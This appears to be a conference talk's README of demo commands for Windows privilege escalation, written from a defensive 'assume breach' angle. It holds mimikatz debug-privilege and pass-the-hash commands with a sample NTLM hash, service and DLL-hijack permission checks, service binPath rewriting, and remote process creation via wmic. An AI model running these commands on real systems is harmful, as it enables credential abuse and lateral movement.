# PrivilegeEscalation
Demos' commands

## PRIVILEGE ESCALATION in windows

#### CyberArk Impact 2018

@Doronaim



<u>Intro</u>:

In this document you'll be able to find all scripts and code I ran in the session. I hope you'll find these tools helpful in protecting you organization from within.

**Remember **: Assume breach is the right state of mind.



<u>Tools:</u>

1. Windows Internals - https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
2. Process Hacker - https://wj32.org/processhacker/
3. Mimikatz - https://github.com/gentilkiwi/mimikatz/releases



<u>Part I - Local Privilege Escalation:</u>

1. **Token Manipulation** - Flagging up the "SeDebug" privilege.

   In mimikatz : 

   ```
   privilege::debug
   ```

2. **Unquoted Services**

   In CMD:

   ```
   wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
   ```

3. **Insecure Permissions**

    Check for weak services that allow normal user groups to modify their configuration:

   ```
   accesschk.exe -uwcqv "Everyone" *
   accesschk.exe -uwcqv "Authenticated Users" *
   accesschk.exe -uwcqv "Users" *
   accesschk.exe -uwcqv "<GroupName>" *
   ```

   Change service path in CMD:

   ```
   SC config <serviceName> binPath= “<command>”
   ```

4. **DLL Hijacking**

   Look for folders with insecure permissions:

   (**M**) - Modify (**F**) - Full Access 

   ```
   icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr “BUILTIN\Users"
    
   icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
   ```

5. **EXTRA**

   Check if installers are auto-elevated:

   1. ```
      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
      ```



<u>Remote Privilege Escalation</u> (RCE)

1. Pass the hash using Mimikatz:

   ```
   sekurlsa::pth /user:Genie /domain:harame.local /ntlm:64f12cddaa88057e06a81b54e73b949b
   ```

2. Access network resouce for having TGT from the DC

   ```
   Dir \\DC\C$
   ```

3. Use the TGT to connect Jafar's machine -  and run a code (we used notepad as PoC)

   ```
   wmic /node:Jafar process call create "notepad.exe"
   ```



[Sploitspern]: https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/
[Pentest.blog]: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
